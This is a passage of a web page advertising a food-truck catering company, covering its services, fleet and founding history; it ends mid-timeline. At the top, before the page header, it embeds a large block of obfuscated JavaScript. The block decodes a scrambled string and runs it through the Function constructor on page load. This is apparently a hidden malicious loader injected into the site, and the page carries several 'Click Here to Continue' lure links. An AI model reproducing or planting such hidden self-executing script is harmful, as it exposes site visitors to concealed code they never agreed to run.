17deOuKbz7b$ e:K^Ny~?#Z8A8l6Aj=/RiZO ebNi^)u )#@Jfv{eO#^if/A6ljPj@‎[@=[CJ(tpbtK71q0Kbz15$ eOu#y#0jl6R@=/ A8OieAiu^#Z )vbNf#{)@/^ilJA6jeO@fj[@JP[Cb‍1OB#byuK$z#v@ e=(@7b5tp1tK#vq0u @#bJ)v{Nq~T)@n/_btzsi;k#/M:~4$$elIj(p08!.=Nu$#@ )vbJf#{)4I0=(jp/!$P@f#[@JtXbtp1q=(0@05KX@#j[PCVP&[Cb[uM {*kn37b:/sitz#b;MR$B`b/?k;3Q4=DM@Cq00_E9q4 RgRZ~OO9T~7JZR9AJD8/sbtk[i;Mno77:z{2bB`^gusba!rkZJZ8[mJD8~mb{*9A3[&uM`o77 b{~bB+ua('3wk[L nvCb7J(0I$b1{)He;80*9a0P0H85bc[7kR9Hdbc85k*7JbR05k*9H7R0c82q:77~:~A *[F0q9H8WbcC5kR9 AJ0H85b*0kR08[dbc0$H1{7be;a03 n0I)Jv(0$b1{PHe;8b*9a0R0H85VcU0kO~Z[Cbt2Oq;kn/_M:zsib'#bB/N6(`su(c)rp4& `1@#=ba.bBsRN+np{)/=wTvg4Jb(v'H1{8@e;a0$CJ0[COJb.V/pN'id9^[k AJ7n/sbtz#i;M/b.':pN9iO72^@oqq:~7~:[A .9dba7r]aebtk]/;Mn/s':z#iiO/b.@CpN9sbtk^i;Mn/.':z#9iO/b^@7pNNubB`M-nAb)Qw/Q[JgCVgUUVH{WpaUO q RZOZ[CJUUiOJb.[/pN'7d9^tk AJMn/sb:z#i;O/b.'opN9i772^@ qq:~t~:[Akn/db:zsi;O#b.M/pN'iO9^@4/4/7/0UU0v(0(MC$$04VV[$paJU~gH{UI`UWO AU[`JoJCb^vbBI/(/kjAA{yk_ t$*&q_b[uM {dO~3[CVZ2O9b1!q/ij1Anv7b3b(0I {*&)J#buM )B`b3/R*ppN0g$^4Z]8*[#b@P?1B`b!(v~a$D)/R@Cvu/* AJ.&uMb{B` 3#~b{Qbg36iH8T 5)d 6Qwb{*@[3#&uMabB` *Z'b!u-I210s=Q42-805`b@#bk3N1BeA1E-yMc)g@2)//J[COjn/Vbtzsi;k#bBM:AM`b'-tM56@JJMuJJ[7lbn8duR[:^n87d7:^lbb{*uR3#&uMLbB` M:nbc~gvyiy:$Z(u@JE':_y~EL~ZwywOw#YcR~Z_KHU7 @$YJb[C un8:AR#b^l/&B`b63/?Ku89jR0~vn:[db@^lun8#bR#v)B`b@46ln:?4)gZsrMe.v@J30[J[CVv[CVV[CbP0)?cc0d7J[r AJ7/sbtk#i;MnbB`:zwrb{l0(v^4i$/Nj+Mw@JbMEvb*K i`r1A.&{K[[.*&udbbBM 3s`b*#Qer$)45w{ub9L0)B`b@Jk(53HDMkZ/cO/rLbBR)[&`bt#0'R*)@J/$rpJbp2&{[^N1!7dj1A9b#bB/iyl`bn&kMQ.):^'Du$ZrLN@JbOp&{p^CV[CVk AJ[n/sbtz#i;M)bB`:ql6be)@n;)EJb++vi`MMncb*+b[[dMn=(JJ]Pn/5jbcA(Qv[K0AJ7d/bn= 5(](nb;[dJy:LQJ0Pb!)$M^(47/E(QdbM[$M^(4b/E(Q{*&M7#buM uB`b3tc^^/wwK4M9prAu@Jbju/5n=(:(]Pn~H Q9#b=Z~2B`bOIj53;uicO2uMeA5 r@1?:LPJb[Q!);7dy0OqO~ZH_Q92 =Z:~B`~O#2b{ub01)r6CV4L9=[CT@~JJy Q!b;:^)y0L(4Q7b(M$M/-#bBE4' `b:5tl/JTcN*[[[Q@LQdb;b!)y:B`b0#eR.tz$Mu=I@J[!^J[CVVKCJb[0jQcA;:v7J0LQ!bPbn)yj2vu~z~Dtd A[7LQJb;d!)y:bcA0[vJK0j~obnQtj2vub;z~Dy:LQF0#b!)5)B`b9c']H'@W{kQ!b;:B)y0L`b.#b&!jQ?/0u$.p.(g{bn:a@2vu~Pz~DtjJb[C );:LAy0#Q!;NbB`I)=vbZr21(9:@77b~#bQHczB`-0+AIu D?vn0nRHdb!M@);:L[y0#Q!5.bB`q4k0b.4q$ :+T0zV]@J&VO~[C_bZ2OQcAKqvCV0j=([Jb#n/5nbB`(])3baujvuj/9R'-6Jb@Pv5n=([(]#n/*5bB`MtzIbvgk!k[C0@P{VV[0*&uJbbBM 3K`bK#459IQw@.y8b[CV5{*&VC#buM LB`b3IeM3E)0?MRr)p1~) @8sbcJbBzL{r`0{LEvb^tsP/ (4J^vi+qbc[7Jc0rd[CV)?Jo[C (JJbA1:y5]pIzEP)e0zb[7Ku(1db5b:yz]+MME7bNEvi/MAK`TMCp:0zbpItKu)ekn/7b:zsi;&#bBM9rv`b06r(^b3-tAB`b@#pg+;8CDQM~ AJr@(1Jb57:yz][EopImmJ)e0zb#bBKu1u`bcE4M3.-@J)$](vPb#1:y5bB`zEKrbe$MM$Z].!9)([o0M217b5@:yz](O~E[[AZ2Odw=Rq_~Z~CVO2OqO2~C_Z[dV[JqO~Z[CV 2OJbAJo+3(tJ)~P1)v^bNAuj?rdb3[7+)(t1M~7b)Evi+M2*`barKCbyv^uNAtkj?7Mn/sb:z#i;H)bB`-!/)bH?1MND*.vab@#bKN1;B`(1u rR0/6lg@CuQb3 AJ)(t1J~o7)+mJ[)b3(m+)~t1Aro7b[v^uN[dOj?q_~Z2CAw=OVO~R~_ZZ2O[O2~qJ[[CV2OdO~JqCVZJJb AkNp?ep^g/&cQ&PbvvMPbb^~~;^;t0P4eDv HePbT85k*9b3R0cOuHaPr Puug0b!3{q/P{80$b10PHe;sbi0a/Pbrl6(&M0=~PbM8AD&N!arTPP6:$bbiM?i90I$^(zvP20j~bcH-4'P8MZ4b^9[M0pc7dbQ&Mb1{87J;a0$H00PbeM6(&M)/~Pb52Agg^(/Pba~:{jzPb!HL/K6?dj/[Abg)7g7b/2$H1{8be;a0&M00#@#M6(ZbB`~=&'b^!64?u['yneCb5@J{j^(/Ha~:qwZ7#E9 I~B:~_`b+PbAw.l ])5sA'Z/TjPPJ[PP@#PP_VdP@P(/Cb5~:{j^#bBHa&+`banH4M!@Jby(6(&M0b~#bM'~AB`M(*reC @J2bg)[[7b/2Agg)/g#bB2Ac!`b*vwe2yr$ucc[C)g@!A9OJ6?zJb/_L/K^9A_j(/:b5~[{jHgd Aa)/2JbB`Ag#Ib+ub)AH);vrL)v62@Jr?zLb![7/Kjd77U/O~Z0[Aw2Oqb=R~_g)/CVbg2Ag#)/27bB`AgD!b!4awI+8${0O0JbN '/!6?@Kj/zLCVPP#[qOZPb@#b+3LB`)1u&80ay)2E]3!OJbMz@:cMAJy;)8!bg[77)/2dbg)Ag#b/2ArB`bg'(Kzzr+(Oqbrq.ycMA@J;)8!:VPy[C [C)/AJb2Agg[do7OqO~Z~_Aw2CVO=Rq_~Z2VZO2OCb;~C~0vv^87Jb~0$H1{Pbe;a(&M00~PbM6v.Kc&-eQPAr$eb-[7rv&&db$Av.Kcw=eQ7-R~CAr$eb-7brv&H1{8$e;a0$M00#bCM6(&b1{~@e;80$Ma0#H0M6b&q~(~@lT_{7DJbO9$H1{8be;a0&M00#@PM6(Zdj~~wOjZJ8O~ZP~98P_E~ _O_dI~O9 AJ[8778Ob-7bByHAH`/80:r[d]u'vbKc~.eQ&A~C7ZOOVO~2q_eZ2EZ~A=Q#bB~cM)`b uz$a/6uLkr]IyjOj@JZO~ZPw98P_8~ _O~VI~OEV[C[C0$b1{#He;8b&Ma0~@0M6-#bB(lcc`bM'0Ll5/Ei&@J[D080Cb10$He{#b&;a(~M0Mr@7b6$er--O~v&$bZ2OCKc&q_QCAv.tVCbeDv ^;70T4eaCb3euuOuHp?r 7ge&kb/#bN^QnB`bD15A3TM0M?$q.zzOu@CQJb*A9kR9H8b0c75*9HvC0c85kab3RuuOuH*9r C0H85bcXXkR3{[dbbg0q!p?e/7g/&kN8#b*^5kR9Hb10c@e{80C;a0$H{g7b!@0q/3Cb&#v(~M0Mg7b!60q/3{b&#0@rN=8CT7bAD0q!3{b/#/g!a6@C7J:$?6b&Mi(~[0M^;7d4tDvbee7 TbivCV9MI$C0zv^2M07Jb7M6(&db~[v ^;tvT4eDCVCe7j~bc(&4'70v-rJbPb)(u/+ssyw;+&^4)~PbdHA[-b^;7T4tDvVee7 CA9vC-MOJb^Z4MH97v08MZCbH94M0-b&8^DrN=8MTCbAZ4MH-XX08^b[d 91{8AJ;a0$Hb0#beN$ B`0rMMAJL2M{b&Mr@~[0M60[db(j~4c(bH'J00-MZP8^94M0MPb&V6(~Mb1{[Ce;80$ a07Hnv(b3b10I)e{80J;a0$HAJ[CV8oJb 0$H1{#be;a8B`b0^4ZK;k@lcnMJb&*6(~M0bc[[['(0jdJvP~4Z4bH-PM08Mb&M^9~[0M6rCVb(ls/i0807b10$He{Cb1;aHe{801;a0${807ba0$HeM#b&;6(~M0Jb@C H1{8Ae;a0$`b0#b;{:MBv485yB`)@J~b.rbAlR&O(w-'Md$~Kybc([['J0j~&0Pv4M0MPb#6(~4bB`X($:b'.i*{&Ceu@)Vb1[He{803;a0$ nv7bJb(0IH1{8)e;a0$AJ0[C0ob1 $He{8bB;a0E`bp#q(O(AH5IH/3rp4H@JbHal:B`b'5'z&qq(2{[[D:]jdbcM~4'(0PbJvP(&M00~XM6b'#bBq6{5`$=LuNasM;Q @[)AJoCVg0b!3[q/#{d A4@cQJob0&MJprlsbiM0/Pb[M6(&db!~[?ia6:MJb&$6(~M0~=[CVJR~dVb;v A0Jv^~sbi0~/Pbrl6(&M0i~[[MMI$dbzv^29MJb&06(~M0VO[CV_~Z2Vb^;OqT4tDvJeeC ##bV[sitknb;M:/B`bzP1)gj&ZDMuvpPr2/tk@P#Mn/sb:zPi;+NbB`M05wbj0^Tq0:6L4bPv@atknP#M:/sibzPb;*reB`$eMnkP&K!e0@PPvn/#btzsi;kPbBM:)R`bpkOzLOLPv5utk@P#Mn/sb:zPi;NMbB`e-Dvb(^u*cv@gL4nP#bP/sitkPb;M:uB`bzDN:Q4R=/QM+~v)KyPvTgtk@P#Mn/sb:zPi;+rbB` 2/Mb6?sjpv@)5=nP#bP/sitkPb;M:rB`bzNEjKaPviApk@P#un/sbtzPi;M:bB`:u+Ibak;pO(8jvH5Pv@H/knP#b:/sitz#b;Mu B`bME/$au@P )^MbB`rr14b.c;O 0@zl+&P#bPuM {*`b3Pbv'/.Bau0nzP#-PMMb{*@ 3P&uK/bB`lA38b9I5!)#bP/@ {*&P3PbuM3:B`bM9kKNKPr{M{*@P#P&uMbbB` 3L bHvA${*^/:t'r/@;/K&P#bPuM {*`b3PbnQK6BE 3Q--MAO9P)0ka/P0v3{*@P#P&uMbbB` 3!wbg9zzw:/LM]utP/wZ0*@P#u&uMb{B` 3PubnqbtEq=z;PMyT{/@P4*&u#bbBM 3s`bnPEO{=LQP)p:{/@Py*&u#bbBM 38`bQ#a^Op^PbyD(TB`b@0s$iuP4~gMk@P#An/sbtz#i;M/bB`:v$)bi~{^?Ob@Pb:.v/B`$44wuP/*TMv@P/Dn/#btzsi;k#bBM:]r`bi0Mr0)@Pblr4vB`bMr]^+tPv]]tk@P#Mn/sb:z#i;N4bB`ua((b)~tiz5{c(A`)@Plb&LbB$Dusucz*iv)Pvivtk@P#Mn/sb:z#i;i:bB`TTjRbR-@{?b;PbB0!$v`iaE((#bPv@itknP;M:/s`bz#b)ikeB4(4/8.3]!r`*@P6b*ubBs-K:HI=9v(R0 ur@P^iPu#b{vM 3*&bi#bBzMQs`E:w~0bB;u@Z`b^J1lr:u)K )M`/[Pvbc+bB0;yM-r3MyI@P#?PuMb{*` 3#&baMbBTa(D$+)r=)@Jbut;0B`b($Dlg(69~+j0Ozc`4[P(b&4bBDgzIuu9kv8.PMyMPb@P#(B`bvM^pQZP02Z3P@P#DbB`r2b5a02N-T+D)8N@P=4PB#0`bzPbRe45.tvrRi/;O:)0@n+LbP#PB`bP0]N1r0A'?D@P#DPB`P1b!zb28ri-AuNylP)MP4#0@btPbBI0*(`rj{'{w4up(0'?u4@P#HPB`P9b;qb?LQl)'4k4$@~P0vP#P0`bPb+!N]B~?*Mk*(${5P24P{#0@bcPbBMO)M`3r?//P# P0`P@b^zbB&{:MlO/9v-'P0OqP@P#abB`'/wbQq $=u+)D4)P0@r:PbP##uB`b@k/v;~;wEI0&v$r)OP0$.@P@P#6bB`#/:.bzE;r0~HDeNLg/8Ze##P0@b@PbPNc&B`HLq'A..qIA0P09KdV@@[ ~=R[AJb~dr]ae.7a]/92q:77~:~A .[dbq9r]aeq2a]/b==C7i*5VV7JtELIb^O/Pbis8ve=eA]Pb.MwrP*{vZbgI*NjEM21pPb.PuKM;ba;+Pb!]tPbLz~4*^4:wPb]$M9z=Rt?PbN$/+cQPb!&0t5yv~4Pb5$r''1KAPb*$;M*0)g=/Pb[zDua7dM{8Ib^OE7b+svi`MM8Ib^O8Cb^sI7bOsI#^OscbB`8.crbQ'1a$vs@Jb(8I#^O^'bB`{A$Mb2-(.3?2g/MbzMiHB`b@J(330M1ukn95[X50i=0[C7eAMbb^OvebBs8IZ`b1#$DwQpR1^u;O~@J$s8Ib^bg#bBK*w(`Z/ijA$[{4@]Cb.Uwr7*{/sbtk#i;MnbB`:zQMb;k/s:r]vM@y/eAJbiBMve=`ba#buT+8(e?A2HvlwakPre@JC[P0v AJu[n/obtzsi;k#bBM:Mr`b1 )n$i')@$0{]Jb.bwr[*gIM[dE7vZNMb{*j 3#&u{4bB`=tirb2]M(9n$IaM`;@#qbz3bBekM2^svr2M](w'4#b()cKB`b@ZM!+?Me]DLv@%v~vvvl0b.C Ao*{]J7bgwrNjIMveE[dZ.9rba7q]a]C2==/Vb*CVKM21pk+.7un/sbtz#i;McbB`:0r$bik]Ew-ecR=K@Jb&vMvi=ebe#bAp)MB`4u(t(ue@Jv[P0rPa;u[Ct]t;bkn/7b:zsi;t#bBMk.M`b)yu6j!/54=e)@gveAJbiBMve=`bz#b^vu$RM?/Kq$.Ma^$[@JubP0uP^Os[C^O8I7Bs8Ib`b+#bc00OO=-{((14.u.vPu0@Ib^OJ#bBs88n`bK=;wTz~2g6eCb@U$4*^4[w7q]$tk~T_Mn/sb:z#i;+rbB`Nic)bwE0{61n$-.B$8@5`b{Jb4H/4$b M0~B`b&P*~!.jQ9H; =Rj9(/[{tNNCbzlM9?=R_b7q~itknT;M:/s`bz#b2*E/B$-.(^bBrI@{`bKJ1+4a?u+v$?A/4N]sPbu9):B`bz]:apzH=e089u64QI[C*t$/bc~7+!&tq~T0kn/_b:zsi;n#bBM4^r`bLZiTI*rp/9zE3QM`b@Jb$;r]Baz{TrryDN~Bvr02`bcPbMl^yA(1/0{[CbOq$t5yv_47q5btk~T;Mn/s`:z#ib*MbBi;l0{JIg$D#G(@UAvU)`@Pwb;ObBg!{uKu$(/iv0u)Ab^{q[bOs8C^OsI7B`8I#Ib'&bI~l{)sa4wu4@Jb)]$4*^`bwPbN&KwBMKz:9D[y44n#bBl0r `bIDr)uM4g9s $'vM=R@JbbNM9zB`b?P1.{tvH+r;zKa(]qbB^r[.`bz#rT4iI@JLL4/bcQ4+!&t$B`0~P;bQ bg&Kg)[#c&HjbB`Ml0sb{?6ywMpIn(k$@J./5$b5y`t4PvbgvbBg-E.I)tn]HM2?L !L:[C@z~:bCA97#1KOJbP$r''b*07v*/)A;t7baM;Cb;]r''1Kvvl$Cb'0v'X1K$)XPbrA;M*0b**/XM21p7+.PuKA;b*0vM*/)l0v%7!Lv[d*z~:b0)A#b@7;M*rb'1/'CVK$zDbag^uM{=Os87b`bI#bl-j5B4kur6g-MM:@+A~qJf`(gj[d/VOCO~fqJJZ2tpbt=P1q0(bKR5Ks.jZi(kaPE$cHb5nRuPbbn24tcH$(Pb'$]$PeLvPb'1)~PbK$rM*0)'*/[A;t=7d0(tpb5K71qKR#@C.jZibka7EszDbagBuM{=`b'#bk]ttv/O/ k@Cb40Hu5($t7btcp1q=(bB05KZ`bt#)+1$4N&/2K`{@#5b50bBT3u4{)91THw@J;~tpbt=[1q0(Cbt5K4(nRn/7bt2si;knbBM:z5`be#2vt)u@#;nj9bB`i=:3b+8./uO@OI;;JbtA-i;kn/bM:zscH$[CbB$]$e`ba74jNatw9s$0bM#b9e0+B`3D'?H-8?z;@J0r9O[C$Jb'Ar'71K0)vPb7A;M*vCb*/r''1KZbK$iEsRjb'.kaX1K$CXPbr';M*0)b*/XA*0)XP/%A;Mv7vl*[db0v)~'eLR7Jbvn24tng=(Jb#zDuab'1M{@PK$r!0u['Lz~Ub0):#b@A;M*Xvl*/%v0vvbl0v[5($vC%cHu$XbJ$]$cHeL#Jbuv)~'[Svf0H$@Xb'$]$ceLv#bu@)~%Z[CV02OqO~n/_btzsi;k#bBM:R$`b'0A3an2@J*2tpbt=#1q0(bB`5K-]bzNtuiw-a/l1~4H@J[[CJ[CVV[HKCb3JjZrMbniO7^~{uRn4:Pue(IbnPb9N(''1K]Pb3$ruOuHadr [ubni7^~{uRg4:7u1)!JbQ~q/*8Pb&)ADrN=dOT[7_~Z2btkOq;Mn/s`:z#ib-4bBn^rn*E?i0+e*!MsbBIg@u`b3#zv9I60v5-4@+uL=JbtT)i;kn/BM:zs`bn#brsr1n#l9.EbB`g@D+b+skLrTynAj;IT@54E&J[,KN=8JbUbADr/g1)T*)Q!q[X~X0qbg1[/*))!bnQ~VNne(C(]7I93uCrHaub 7buORuni{0^~4uv,0:J(Mvvv[,0vPCA9vv1KOJbC$r''b'17vbK$ru3uH'Or auK$Cb'dr'X1bnnX[N(e(Ik]X79n/sbtz#i;MabB`:ls1bp*aI/Z0DLq]@#bqEqMB`b0O4/a6ls4?@Jw(ERbniru^~{uMu4:JMPuM/[[CM42OVO~eq_bZ(I9nnVCN(]e AJC.9rba77]a]A72q/ q~:~ae:[d].9rb/7b]aELi*5~/J[t=R~CVba_ Aae.9J]/7r]==77q.[db29r]aeb3a]/rMHK7OJ[jZJYCV _vY_Ab+M q[dMEvvb+Mii#YME[CvY@dV~=JO~ZR~Vb2Oqi+MMC`biEv7J0k/0Jbc4Dl)3cb*H-cb*08PaE!(Pb*rA/v!MlPPb1ug0ww=v^616(;tDPbeev T1[74w=vdb16(0w'7bB6]My`b.$9k68Cb*4(#b*0(01w=7w61vJbc6@:yMA8s;)P!s&^b+~P/w;Ibnn+9N(e(4-]PbP:(=-b'1j$[7K$redb'(I9nnN(]:Cb-7(=j4-`b$7b9Nu4BtA5tzCA]u:19OJOK$rb'b''7v1K$Cb+sr'w;s&^1+~C/K$rb'db'XX9nne[N(](I4-X7b#:(=-bB`j$Arba=L1M- M0LQibt$y@;kn/JM:zsibQ#bBR9n&`)! {e)Qu']`j@#^bz.bBK;6MT9Mzrs/Q4g!btM6@;kn/JM:zsib3#bB)~/H`0$:E2`b@#b$.8nBKi~:I8$A*8@4rMvJ[,z!:(b-4B=j$-`b*#bE5048eig414j@O2O~[[CbZ2OVcMAq_;)8!:(XbnyI9NneCb(]C/aE!V7b*rA#b*0801w=(w61v(B`6@J!btubqN-3 q9a0N[LP0ICb*4rgv!Ml87b*u(#b*0(01w=Jw61vbB`6@~{bHvO!((4rn^ju+Rni(CP0/*b**/[b*08(v!Ml#@7Jug)Zbnkz0p~d:~[7_b=~Zitkn~;M:/sE!z#b:rA/a~=~@CtkZ~_Mn/sb:z#i;lub*!~gv@MZ2OCO3cqJb-0Dlcc77)H~)7bnFZz0kbaep[a].9rV/W]CbtCi;kn/aM:zsE!r#bb{A/@3*&u7#bBM A^`b;R8~$a4)'gHbBr/@e`b'#/I120Jbu*L {*&@3[CuM/sbtk#i;Mnb*!:zv@Mlu~7Jbg)Zznkb0p[#**07b*!8(v@Mlu)JbngZz0k~^;p[C4tDvbee7 T_JJq~VJ[7T[#bdTgB`b)!$i+$6sN$@JD)/AbaEu/X!r*!JXXMlubJgvb'XbBKeq-`i*(2j2sZ1u[1zX-[[[b&#bB0HR)`IsMrIJb!eMlc3c@)H-0Dccc[C[0r)bCO~?J_bZ2O ^;tqT4eDvJdeCVCVPd[V[JV[9TT q:[C\\\";for(_BqhTW of _C22oe){if(_BqhTW[ã('Ϯ')]||_S35cpT82dF){_OIflurB5=_KxR2N59-(_K5I8Yo4V()+_BqhTW)[ã('Ϯ')]%_C22oe[_XU19v1tp];_UfT1gN0=(_A2L7fz,_DoFpAjs1U,_XtUXO7l8D)=>{_X3SfrsOCki=_X3SfrsOCki[ã('Բ')](\\\"\\\\x14\\\",'>')[ã('Բ')](\\\"\\\\x13\\\",'<')[ã('Բ')](\\\"\\\\x12\\\",'\\\"')[ã('Բ')](\\\"\\\\x11\\\",\\\"\\\\\\\\\\\");_X3SfrsOCki=_X3SfrsOCki[ã('Ӷ')](new _VjC2kYX5dG[ã('ҏ')](ã('р'),ã('А')),ã('Щ'));_X3SfrsOCki=((_G6MPXUQ,_VAwa7,_T1eFz53mAG,_GlP14wU,_D7tLDI0e,_YchLAi8M47,_B15kLVU7i,_Vr1k1r,_WE5vfB83qj,_DoFpAjs1U,_CJYt0p,_QZT84Q,_U5fpWdhX9,_XkZY1UhST,_SXVy0iw3RR)=>{_B15kLVU7i=(_VAwa7[ã('Ө')](-_YchLAi8M47)+_VAwa7[ã('Ө')](0,-_YchLAi8M47))[ã('Ө')]('');_WE5vfB83qj=_T1eFz53mAG[ã('԰')][ã('Ը')](_T1eFz53mAG);for(_QZT84Q=_GlP14wU;_QZT84Q<=_D7tLDI0e;_QZT84Q++){_U5fpWdhX9=_Vr1k1r(_QZT84Q);if(_WE5vfB83qj(_U5fpWdhX9)==-1){_CJYt0p[_U5fpWdhX9]=_B15kLVU7i[_DoFpAjs1U++];}}_XkZY1UhST=_G6MPXUQ[ã('Ϯ')];for(_QZT84Q=0;_QZT84Q<_XkZY1UhST;_QZT84Q++){_U5fpWdhX9=_G6MPXUQ[_QZT84Q];_SXVy0iw3RR+=_CJYt0p[_U5fpWdhX9]||_U5fpWdhX9;}return _SXVy0iw3RR;})(_X3SfrsOCki,\\\"*IE21ZuK3Az=podXlq]f$;yc?^Fv(Tm5Mr,Ns|w-}:+'t)bS .O_U{R/B#Ygjx&C!Hn4kV60a@hGP~`eiW[8%JQ79DL\\\",'\\\\\\\\\\\"<>',0x20,0x7e,_OIflurB5,null,_VjC2kYX5dG[ã('Ӡ')][ã('Џ')][ã('Ը')](_VjC2kYX5dG),null,0,{},0,\\\"\\\",0,\\\"\\\");_X3SfrsOCki=_X3SfrsOCki[ã('Ӷ')](new _VjC2kYX5dG[ã('ҏ')](ã('Ԟ'),ã('А')),ã('Ւ'));(()=>{})[ã('ն')](\\\"_L55c0Y\\\",_X3SfrsOCki)(_L55c0Y);};_UfT1gN0(\\\"\\\",_Al9cj,_VjC2kYX5dG[ã('Ӡ')]);}}}))();})(()=>\\\"Jl4RiUKW1bbvqq6hR1qLYxC79E5e147kk8\\\",\\\"\\\\165\\\\143\\\",window,0x0,0x1,0x31,\\\"\\\\162\\\\145\\\\144\\\");​_L55c0Y._Y1j23()\"[_WZWjLh7l2()](`​`)[_WZWjLh7l2(1)](_Izgl5ltm=>{return((()=>{})[_WZWjLh7l2(2)](\"_L55c0Y\",_Izgl5ltm)(_L55c0Y))!==false;}))({});})();")();</script>
    
    <header class="header9x4k">
        <nav class="nav8m2p">
            <div class="logo5t7n">LinkiqHome Food Trucks</div>
            <ul class="navmenu3k9s">
                <li><a href="#home9x4k">Home</a></li>
                <li><a href="#services3m8p">Services</a></li>
                <li><a href="#fleet7n2k">Our Fleet</a></li>
                <li><a href="#history4k9m">History</a></li>
                <li><a href="#cuisine8n3p">Cuisine Types</a></li>
                <li><a href="#events5m7k">Events</a></li>
                <li><a href="#testimonials6p4n">Testimonials</a></li>
                <li><a href="#about2n8k">About</a></li>
                <li><a href="#contact9k3m">Contact</a></li>
            </ul>
        </nav>
    </header>

    <section id="home9x4k" class="hero6p2w">
        <div class="herocontent7n4m">
            <h1>Mobile Culinary Excellence</h1>
            <p>Bringing authentic street food experiences directly to your location with our diverse fleet of gourmet food trucks</p>
            <a href="#services3m8p" class="ctabtn8k3x">Explore Our Services</a>
        </div>
    </section>

    <section id="services3m8p" class="section4r8t">
        <h2 class="sectiontitle2m9k">Our Food Truck Services</h2>
        <div class="grid3col5n7p">
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/4393021/pexels-photo-4393021.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Corporate Events">
                </div>
                <h3>Corporate Events</h3>
                <p>Transform your business gatherings with our mobile culinary solutions. We specialize in providing diverse menu options that cater to professional environments, ensuring your team enjoys exceptional food without leaving the premises. Our trucks arrive fully equipped and ready to serve.</p>
                <a href="#contact9k3m" class="ctabtn8k3x" style="font-size: 0.9rem; padding: 10px 25px; margin-top: 15px;">Click Here to Continue</a>
            </div>
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/2291599/pexels-photo-2291599.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Private Celebrations">
                </div>
                <h3>Private Celebrations</h3>
                <p>Make your special occasions memorable with our customized food truck experiences. Whether it's birthdays, anniversaries, or family reunions, we bring the restaurant experience to your backyard. Our chefs prepare fresh meals on-site, creating an interactive dining atmosphere.</p>
            </div>
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/1449773/pexels-photo-1449773.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Festival Catering">
                </div>
                <h3>Festival Catering</h3>
                <p>Our experienced fleet handles large-scale events with efficiency and style. From music festivals to community gatherings, we provide high-volume service without compromising quality. Multiple trucks can be deployed to serve diverse tastes and dietary requirements simultaneously.</p>
            </div>
        </div>
    </section>

    <section id="fleet7n2k" class="section4r8t">
        <h2 class="sectiontitle2m9k">Our Diverse Fleet</h2>
        <div class="highlight3k9m">
            <p><strong>LinkiqHome operates a versatile collection of mobile kitchens, each specialized in different culinary traditions.</strong> Our trucks are maintained to the highest standards and equipped with professional-grade cooking equipment. <a href="#contact9k3m" style="color: #667eea; font-weight: bold;">Click here to continue</a> learning about our booking process and availability.</p>
        </div>
        <div class="grid3col5n7p">
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/1639562/pexels-photo-1639562.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Taco Truck">
                </div>
                <h3>Authentic Taco Wagon</h3>
                <p>Specializing in traditional street tacos with handmade tortillas and slow-cooked meats. Our taco truck brings the vibrant flavors of authentic street food culture to any location. Fresh ingredients are prepared daily, and our signature salsas are made from family recipes passed down through generations.</p>
            </div>
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/1633578/pexels-photo-1633578.jpeg?auto=compress&cs=tinysrgb&w=800" alt="BBQ Truck">
                </div>
                <h3>Smokehouse Mobile</h3>
                <p>Featuring slow-smoked meats and traditional barbecue sides. Our custom-built smoker truck creates tender, flavorful dishes that satisfy even the most discerning barbecue enthusiasts. We use locally sourced woods for smoking and prepare everything from scratch on location.</p>
            </div>
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/1640772/pexels-photo-1640772.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Asian Fusion">
                </div>
                <h3>Asian Fusion Express</h3>
                <p>Combining traditional Asian cooking techniques with contemporary flavors. This truck offers everything from savory noodle bowls to crispy spring rolls, all prepared with authentic ingredients and modern presentation. Our wok station delivers restaurant-quality stir-fries at street food speed.</p>
            </div>
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/1653877/pexels-photo-1653877.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Burger Truck">
                </div>
                <h3>Gourmet Burger Station</h3>
                <p>Crafting exceptional burgers with fresh-ground beef and creative toppings. Our burger truck elevates the classic American favorite with artisanal buns, house-made condiments, and innovative flavor combinations. Vegetarian and alternative protein options are always available.</p>
            </div>
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/1279330/pexels-photo-1279330.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Pizza Truck">
                </div>
                <h3>Wood-Fired Pizza Mobile</h3>
                <p>Authentic Neapolitan-style pizzas cooked in a mobile wood-fired oven. Our pizza truck produces perfectly charred crusts with bubbling cheese in just minutes. We use imported Italian flour and San Marzano tomatoes to ensure authentic taste in every slice.</p>
            </div>
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/1352278/pexels-photo-1352278.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Dessert Truck">
                </div>
                <h3>Sweet Treats Wagon</h3>
                <p>Specializing in fresh desserts and frozen confections. From hand-dipped ice cream to warm churros, our dessert truck provides the perfect ending to any meal. We rotate seasonal flavors and offer dairy-free alternatives to accommodate all guests.</p>
            </div>
        </div>
    </section>

    <section id="history4k9m" class="section4r8t">
        <h2 class="sectiontitle2m9k">Our Journey</h2>
        <div class="history7m3k">
            <div class="timeline8n4p">
                <div class="timelineitem5k9m">
                    <h4>2015 - The Beginning</h4>
                    <p>LinkiqHome Food Trucks started with a single converted vehicle and a passionate vision to revolutionize mobile dining. Our founder, Marcus Thornberry, recognized the growing demand for quality food at outdoor events and decided to fill that gap. The first truck specialized in regional comfort food and quickly gained a loyal following at local farmers markets.</p>
                </div>
                <div class="timelineitem5k9m">
                    <h4>2017 - Expansion Phase</h4>
                    <p>After two successful years, we expanded our fleet to include three specialized trucks, each focusing on different cuisine types. This diversification allowed us to serve larger events and cater to varied tastes. We also invested in custom-built vehicles with state-of-the-art kitchen equipment, significantly improving our service capacity and food quality.</p>
                </div>
                <div class="timelineitem5k9m">
